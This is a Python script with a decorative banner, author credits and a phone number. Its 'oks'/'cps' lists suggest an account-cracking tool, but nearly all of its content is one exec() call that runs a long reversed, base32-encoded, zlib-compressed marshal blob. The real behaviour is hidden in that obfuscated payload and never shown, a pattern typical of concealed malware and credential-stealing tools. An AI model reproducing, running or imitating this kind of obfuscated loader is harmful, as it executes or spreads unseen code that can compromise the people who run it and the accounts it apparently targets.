import os,re,random,sys,json,requests,time
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
os.system('clear')
print(' Love You Janu ❤ ');time.sleep(1)
logo="""
\033[1;37m   .d8b.  db      d888888b  .d8b.  
  d8' `8b 88        `88'   d8' `8b 
  88ooo88 88         88    88ooo88 
  88~~~88 88         88    88~~~88 
  88   88 88booo.   .88.   88   88 
  YP   YP Y88888P Y888888P YP   YP
--------------------------------------
 Author : KING×ZIDI
 Github : ALIA NAZ
 F-Book : ZIDI QUEEN
 W-Nmbr : +923186736810
--------------------------------------
 Note : This tools for personal use
-------------------------------------"""
linex = "\033[1;37m--------------------------------------"
oks=[]
cps=[]
loop=0
pc=[]
_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b32decode(__[::-1])));exec((_)(b'======4NHR6GWX47PUC5DOBMTMG6HCO37MQP47ARFFGHI2X3UZJJ7J47J3OPHBPCQQA4YYV7OJ7LGVX47VB35FSNAZ2DN4UVHKETO3SMBHV6IQTT67RB7TI67RGPDFO5W3VFVQIOFO5Y5LNFGG2OVMRFHC437QTDCD5SCO7KFSCH6JGUHO2YV3WCXWBXQGREUIAYYQQBDZHRVO6TS6D5YXWOHYEO56FRUB4HX6ABVTO62VLPWZ7B3L6BAHBW46BNE27IYDA7BCPDSPBBXH45I7BCPPYNB7DCP32PRFOYRYUXL2K66XMJTW3XGIDRTQICYHQ6LWCU3Z3QQTF4CA6LU7ABHH4FI7BCPOYJB7DCPKYRB7DCPMYRB6HE7ABXGBHEYHR6DCOAVXGPEACQ7DCWPYTQV3GP2ZMRTH6RQ5B6BEPRY2JR5P7AM44IY6QQ5DVK24OAYBKQWBCQVQ4TC2QLVS64NL4VW7RJYRWMCSMFYPBOFTGYHTSPPXY7YIIUCLPOWV45JQT5DJ3MWW7PLIY6UNXYE33C4RLJ3PBTY5WQ2MAKH6HKUFILV2FZVBV3HY3QTFVGCLPPH6VB7Y6776BN6NWFLY2CUHHANILKR7YHR7ASOWH4HD65MGIPEIXUPPPCZ4RPCAGRYLQ6NCOBCOKAPHKP6O7CQAIIZIYJBYHRZFGPCPPEH52LK367GSCHQEVU4PEOHEMHEM3MN66A2424VBEALA46YV4LDHAWIF2SL5MLMC4WZ4E7ON5YK4CYCRLQPQ66LWAKM34D26432JLR74DFRPQGV664NXL2OQOPZGTS3DLO5D6BFBOL3A7AFC546DK6TUB3CYZWVJGZIJ4DUJR2C2MYJ4DU47FFZ6KRNAHEZEDGWOGVMCEFR37M5EU5WH3Y5HGUGKEWHUGINA24F7DDFGBJT6LIFQYEMFEJHXNJQ3EUJ4OANBGTEBZDIFYKRTOCV6WBAR5DEQ2DIGNWR2PY3AUD3PMRGIHFH7UVHXBFZ7HD2A4BR4LFQHASPFM52K7APGQM3DYFTS43BYFDSPDA3VN4IU4IAYFNCOQA4CCBXMA4FEHITBUUGYHB3MAWFEQIT6IWEENCETS77C2FYP47HCR6RXZYI7A5MQ4Q2AIS27TKLS56FSWMA47KISISDWRLAKP2OA6DFCP7WYX2ECAYSIJWLQMFC6ZA5XCA64JGHCTSCCYGQUXYOBONQ7ENOPY4NZ6FZQRXLV7FBSHIIO5GBQTPBTRMODM7WRPDEVOATOXNQOQQ2O7SB6EKQNQSUFZR52U2LRNVGAWW4GOYXKMWU2NYWKPFLMSZPR4Q4NPNWBHXY2KJY2JYYRVDLD3CDUFUTYAMNA2QN5HBCQHVQ22MTLPX3WJP2P5CJALLUDSHCGIEOBNRRYMKBS2X5KUZAMD7N2XCYX3QNWEYQF4UYYUEYHUUWXHQJE6ECHW3GGWTA3WB2DTD3MPDQ4VQBXNJVQZULMLFLIJCXOXDBVOZ5Q7V2SPQVUXMWV2NYV3KDWLXRUSJGRS4BQZKKLRL4NIXKEHB3UHM3WFRO6MYGDFXWLAON3N3VR5WQ25M43UE3WL3FZ2FWTLAPBWG3PCKHNWZQBVB6SD3NR5LD4UOY4BXT3TY6BS5WDC7TOIHI6V2NQ3MWRKHIBE2OE3LWWZVIRTSTCIMPROEQA7GAGZ2OHLOVDMDYNRHXIRL7DDZRZ2RDMUSEZCT6AUTQ4SNPAZ7SF5IJEA5IBDQHKY4RLDFSZ52HZC2HXR55GJI5FBHGBNUIYDBR63I32O5G65DXRR7NH6DQ3NOQYCK5E5GC25HXC24WJ2EVUGOQIQ6Y6HWDW7BR4GMB76C2CTUPGR7MF6UEWNKCSIQUYPEF5TC7LUQUZIALFEG7XP2RTBYM4PBHMAB6EKU3YBJOVERP22NZW3K7DGJHS3Q5X3BBICFNJT66GD2KPVQIDZBDO7Q72BS45U432SO3DLAGRSFQG4CB6X35PPO3QZTG6BU5SL44KONMZNBJPXLK37455UABLGCWEEMPI7AGCEMLL5GL75FZRZ4YNLB5M5DD5RC6YMA6YBOY3XOBYUHP5NDMOOPRW4OYNJZMMQZGXYR3TAWN753PUAU2G7XP74XDIA6AEOLFAXHDTKDZGYYRC5HRHZRSMRR5GFNSNTJRHVM25W5IYE3BTHM56U5WLM44WLFU5WTG6UBJSAOONHU4ZNQJ5YX5TWHDZDYP7H44DMOMSFU4W46QPREU62IKSHZY4VBYG7T7RVIA7YKCLZST5UHDEH5KV4HWZK3VOUI4ASYOPWLT4NIS3USIEDMS3ULT5D5HLMZT62DLLGQ5B3ONFGEE4C6YCGFGATQNJ2HYQCLQWQMBH2X3JSOPXNKFUHHRUX5NFHTWPF6NMOHDPHYQRVLZT7FRK3HWRPPVHZVN63BZVWWXETR3MZGW5E5LDR7FVRY22XOVTEIGJHYSLLU5QY3K363LKVUOG227KNSF6ZCH47SLZW5VG6N7OCZXZVULM2V7DFSMLXZNJCLPK4M6VHX5BGXSNKHKP2T3QPJV3UVOAJNQMEI435IFRVJWYLFU45UPV5UJAKTE33R2J7ES7V2IRIOYWBQ5GRFTSOX5JINAMHT2O6Q6GL7B64A5TGGHPJUFW22YDXKDAINSZR3R3WD3NXOV6HT6QZHW42PRWKVM4JCNNALN7LZV64UNDN6TGMZ4V3SEFVXNDLX6TE33CCCTZGEX43EKS5GKDMG5ZG2BN3DIPFWG3IWBKWXS6WD5GXDMU5LNL5GVTVUG42NM4XFOGVAQ56TZSRXNNL2MK25MSYE3RBWBLDLT6UUMT3P7T2NPLCEWBS6GRTU2OWRSNV7ULVZ2R23XYFX5WV22IVRWS6X7JB5NXIH2GQ7JOSXTZK7ZTSE5ZOQDFZB2O4JUOXCOAOXGQBTPFRTVETAO7ZR3EY7WC5SX4FGHG5WUWVMLSL3J4G23XKA62WHCAY262GM3WD46QRU6WWEL2QRB4KIX57HEBK4N6TLAW3OJMLF5IT747W4HPU5G23LIYWQY7LGTFOZTZZ755A6UX57C3SVPBR5FEKLJASTOI4SHQMXEAI6VSVHYSH7M7KPIE6LLZK572LPPSB6RI3TDQN4XXETYLHTAM74V2P5M2JYGR4TSIE6XZ3JD2NON3BMZI552BTVZVNNMASPCKBFZMSS3WMU67LBEIG6SHBMIZBBJ3OA5EJN225TLXQ4355LOPPBF5NNMUNKOCZXMO2AOMC6RAUPC6RXDW7XFYT36E3UKKNWKZFHRO6FH2XO6ZHHL6NSVHGB4GCNYK2LH4SMBM57RE4HI5FHLOBSM2WJSF6UQOPPEF6LSJSYLDISVIAMQCNF2KSAYZFSO2AIPJCOCAZWBA3NN6RE6OCPBAJGOAONS4HAYVCS7AAHQQYLDY3HCOMA6GTSIKYX23SY3ASBFRH6Y7MZTEDHN6SSETC2WVEH5QKOEILEYQWDRVJYK74TN42JL2E5M3SBDPVR2Q4GB74XGCD3ZFAM5QPTU3LWA6W7MIAFXWNFAOGYBSX7DJ27SENXUR44DOM57LVQPTZ5Q5HSVCR2YLM7OHJCUF55OUE5DLMXZ56XBKWX25S6D5N4I4XEOURYWU7GWST34O6I36C7CDNHU7IJD3JNLYKRUGHB74RMXO5JHCS4QUL7UL2IBYBWIXEZCZRECXNTS4GOR5CQ7IJYHOHVFDTX6KMOMSFUI2L3E4GWHOTQPKVQMBPDF4ERYWTGE35VESLLKQD5IUER5KW7KE57C7XY6TX6JEYHFO44DM4UDIHPCDXKZQIV23NM5JZRGF2PELNTJVETZSIT4O6KDVK3MKAU6SFU7SCHDLO7D32ST2UWFWT2DXE3NDHZFW5YVUVGAFEZNRO3KBYW42YWX6WOP6WFM6VMQ27V2Y7VINQ4AED4KYEI6JJVBFJ55FC6GCCCRSZU7PWIGLWWCPSLTLXKMU7FORLN4FDS7GLYKXZDW4VVMHHTXROYUUSTSRW65JVPFT2INHTJOTWWX2NCLVVZEYFIDNP2JLECSEXEJ5LVZTJKVHVQ7QXFDDFFSWJ3GD6PZT2KASJ6O3YTJ6MT64XHWKNCU6ZQ7G3YGQWPH3HF3ISMIPCJXG4XRV74HGDLG5AGH4XLN3BTAO3HXG7IPLGKQ66YOR5WTRHHP2K3M4HJBDS7HKVMAS7LIELXWV7S2PGLS563HAZIANP65QSPU2LUYMDDLQ6NZSHAL6UHEMHPOCOSWC4VMB36GERTWGGGNDDQ63MHDSZB3YX37CH4S7FKM6V7XEQEUMXCHIT5SYVZVUQUPV2ARU4DIDJ6XIRFU5XFQMSZ5RJFR4BZT6MYUZ63E7M66B3YR2L6OGS7VKVIYX2AENG7KABQ2PVCKI63KSRD73HTVOWTBI5FM5OAXEQYHUXB3UIYY4PK34Q7JGGYU74JD4OPYJJ2P5GHXPKK7OFALGZITPQDZOQMDJBRNI7JWIRPTZZYKC3CQCFCJR5CCHNHM5TFLZMWZFYJJI4U6MN5MZWYTK2MIEWR4C25JRMPLGTME3G5Q4VN5BLY6MHYLJPLMMSJT7CUOB63G4U6UES6EQ3AYKC24QOFQ2EALAI7D3RAXJ7IVDWPF7COPK6FMQRF4MXUDO2D4YQNBS7EXKB7GN4YUXISYGFOY2HS3UEZGT2XSVZODMS4MO3V4B4CA2E5XZZJMAQXD7BMJZDRMGN7JOKLR2TJHXFZXS7TJDJRSWYSUCUZGWCYZOWL6EHQQUXN6GH6BC2KSCAUUEJNL4XF2XLBYKC24QOHQLAICC27QOGATDINDZRK2XPHVSWB27FU5QVPGDV6CFG7GAAT5UWQSHG7VSJWC4JR432TBT464G5IOFFAMVVMVPHBZB5VZIHHQC5456ISW2WXG5H3UEP2TV5NJYBV72YS5EH3D2JZVRSNKNTION2SM5GX3Q2IVAUJR42F4KUHJ5RJCG63MMSJZYYGYHZL264NJZVUGR3QXSTTS6TVYTNH3LD3DWNPHAMTB4WMKTQ3XA4YQWEU3B46PDMS5QPL7JKKYF3GB2KVJOVWE7NP7VVSSRYRZXIZZKRBD7OZFLLS7CGLLLXSZFKR6D5TPVALS73FCQPZZKAY7L3MRFHT2PGDEV7Y4QQN2Y7PGKC2MZVR2EYL2UWQ2T52P2MWZZNSW4AZVHMOL6F7OWEMMSPFFDDIXRS6LTE7VSW646QKPRKTNCYZIGLQPVGGLM4E5JQBRGDDU52ATVCG3KGWXUSTVBTFAUTTPFFG6A34A4IFQODEOEOIQJWJWE3LTE7USBM3MRLRZHNOPKKJPCQFMIQLX23HL5M6ERGZ3HC6EOQOZ3CP2XCKYI6UJB4K3EKMTUVPASWU6ZYJTA2ZQOFATHKB2X22D32EA6BZXKYVLB42ASSM5ANDBLA7CXAQFFY6VXVAYQM64IXDJ2PVDAJTTPGJFTTKKBBV4K7YX4KS52JCSID5JRF4W4RLDVR3TDUIMVGPCGQV65VC2AVQO4PP6UXSZ4YHXRZMWTZMLGBKVUX2FGXM2MVQPWPVMRTFGKJNEFJSQF3YWXZFMTLAJGJ3GW4F5IL6MLMD644QVIRKJWOTZ6YQM6QBFDSY7I4MXBPG4MDI6LWGYTYWEPSFP3JZDCZTOZ4CGIPBERF33YLSHLCGTPU46URQUPWNEMVC42SZC4WMXURTFBDTPIQPIOGKQVS7J7MKFGVEVPOGVVDZW4W3TDHCLDGLPAXRMONRATQIGJSRCGYK4KM6R7XYTNM2PKMLOBVAOCGZUDX3YI2GHOZ5J34SLSVTOB3K2KFNHTAQ7MIOGFQS34G7LGGGFLCGFVJMW7GDSHM7ZVORTZSWAHFB3YFBEWF3L2AXHHNSWR5M24IFOOF5TYDN47745WGSEG3YZRYASSDB5HPBASMFFESREQ6ADUXQELXHROLOKSKG2MJRKL7S3IVKFX6DFNQUQ4RMNFCTWOSQKA2MWLSGJS4Q5GU2E633RQFVEZA67MFK2VKYTBT2JX4KNACTZHSEQR4WE6QUCFXWSVKYQJS5DJWUMOPDW44GHBNGZCGCSEVSMZJJU2J3MLSKL3RGNTL5GL5ZGJURERJR44SEQMCFJFFE6UEPGGHFSE5GLPSK4G4X44IRGYMWE7IFJVPCW64CGBT7JWAQ6WQTMG54VMNEBMQVBUPWJWC6CFTETFNSSDXWJWC67M2GCSQSGKGGVSAJYEWRFUP22FC2665EAOJ7TVOABPJUUARPFO5CFOZ4LBLL4ZZDSJDEDCLVHTFTZ7YSYUOOLDML7KKEDTRK26SJZQNWVIZDOLDC3H2J42KE5OOCWORSJYY634XPJNJOAKQDMSTA2SMSCJ45GHGV25FRR32NBSC5YWU3PZ7EMG6JPNIIYFN64AP6U6XFMJXRYXIC4S64S7Y6RZCRICU37VOQBPUOOFYXP2NH4CDCR2LQXOSBVZC2FWTCILJVREJ3XQ225G42NHFMPRERD54OUKSRHVPTBNQEO4CNNEUMTMZPNGWKY5EMQOEUAC5UVQQNRWRWCMYJXQBXAM2ZVT4RT4AZ23QNWWKWB3OXZMDWM2ZCRHYFVSS2KZOCXBXC322LLIEXKNE2PDQKXBLMHE3NHZS2BCSFWKKZVCBKVR22YOXDVO2EW3ILBMDKNDBNPND2M5N5OBR5GUDVHOYS3UZS3CTHHQ2DULVJW67DXN3G3DUBVULZNXNE5KLMIVXXVZG3QDXOLDVEW3MAVHVYGSKIM65MDOFEOSKFTGDJ46VGK36Q2ODXNGVSEG7SXTF745XQIYVHU7QMA7VL5JTPZJWDHYPQF3JWBL5CXUZMZLVSBY4QLT6OTVAXNNLWOMPLMV6BBMFLP5LQTKDHWFZP3VNOT2SOEJ6ZRCI5EHO5LRUG3CNZGTELO3W3FKGFWJQADN6KCDH6D4INWCTWKJTV35UVRSCJ6TBFVTOXXVLFDNZCNTMDQRSMH3ULRFNSAZLVJDPK2KWBXIRJ3X2TMG3UMX7EQELERZIG3C3DEZKZR6U3QCDDM3NPF5BUX4AJ3KROMBXWXQ7SXR2LMZVTMYKGDRLX4AY4NVYHR3GOZOUKYR543HNOZFYWYKQV2MRH5AZFX6JV36OGPHF5DTKQDS42YZZUANEVLFJKWDTN6DDKGYZZGLTLOMWLGM2CNPQUPEHVAKNUTRLO3DZFU2QSHGZKHLZXS72JD7MKTILQI2633D3MDCWHWSCL63TG7RLCT4WFMXV5UGGFLSLONKS4JSE3ZI3L3WQCTQSBWRB4PCNVWO2QSG5KGBLLDLQNX5JBLDXVVIW3CFHXTWJPKP2IUUZVZ6PMP3IU32S4GMNYEKKQJVCJO4K63KVRZRJTNOFNFZO5JTJVUTDSYQXLL5NFR4QHQ4T4PZK6ZLOC25ILVNSF4SOVMY4HBR64J7FLNIW4KZWYDJ5WVP4DZYLXHE7SYRLA3E63DTLW7NQ63VUZYHXUM7MSYWDCSH6BLZF2XYOMZB6X5DFJWFZDJFSFPNLFXXIW7RXWZWATJOD3QY277QTQ5MYMTF3JGUS3I77FASDZDWP2Z6OH3LZMFUTH7WOMWZ7M5DBHDCNK7PQB5GVLHKTOJF6DLJT4D4WM4XRCWDPQNJMTWLSBPX32EQBJYP7CFIAZAKLGEYBXD24F2PC2NNHRN2ASDH75LK7UY5UL7BC7Z4HZGYTC55DI6BU2IMN6B5LMF7WT722JQ3L7BKWH2XCN6REN4553IVH7RUXD2BUPTEOHQJC2QECFNOP2QCI546MQWR23LM5RQGLC24U46IGFIFLEPUQ5ISN3LDVFCYJCCLUXXDE5BOSYODFAHHS6RXCUNO4JDDPS6WP37P4KVLQWXW3NJUSYL4KRXOCN3R6XQMB4YN6GNBOYHPHDISAORFW32FQDVT2UF5TEKM3GRL2IEOZEASIEVLL2P5G2LIY3TYCDNKC6BICCOM7BTULURWR372A5OCSQOKTIISFJIYFIFZTPKOEH7MCGNQXEYAZDPJR7BL5C6JCSLTQR6HSPCBZHERYL6GAZFPKOEYT7PAHKBTKJBML22KYSMB5BMFMGK7CWBJ2RAIFWC72BVKH6DLQBJX4WPGVRBMPHYGOG3QXIWYO6JQWGRF5OOFI7W2BXOL6RR5SQNQ2TAEWPQ6SAPVLJ7TDQD7VZOA45PCJTQPNYXG2XFJ3HQHBAZ3TS5VUXBSWLTOQCC4BSUXKQVZTUCLT6NIWLKQO4UQIKXBB72C7VDDV7OKBJFOTQQUCMIHWCLR7J4HJQAXLRSOPCGFQQIUQ27YDP7C6K3UHCORIVQIA3BSQOORDEECCQCMS54LMG7QL777MKYKIFXMVWFVWVWW2X22ZP74IZOWZ6XD6Q4NIV25NT3ZOS54EGZJSTZ7NZO7YJPCK73JOSPZEDZJQVX7END3VNZ3MT5V3GISC5RWU3VJKHCVVBUK2OMPMLYYQTVD2SDDGGQPQRVNJMJS2A4ZYOMGWH4JYYIWBDEQAAR6YNPX5SUN4KLXW2KOCP'))